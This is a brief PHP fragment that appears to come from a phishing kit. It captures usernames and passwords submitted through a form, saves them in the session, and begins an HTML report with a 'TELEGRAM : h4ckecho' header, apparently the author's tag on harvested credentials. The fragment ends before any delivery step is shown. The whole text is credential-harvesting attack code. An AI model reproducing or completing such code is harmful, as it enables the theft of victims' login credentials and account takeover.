...
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
	$username = $_SESSION['username']= clean($_POST['username0']);
	$password = $_SESSION['password'] = clean($_POST['password0']);

	$message .= "
	<h2 style='text-align: center;'><span style ='color : blue;'>TELEGRAM </span>: h4ck<span style='color:red;'>echo</span></h2>
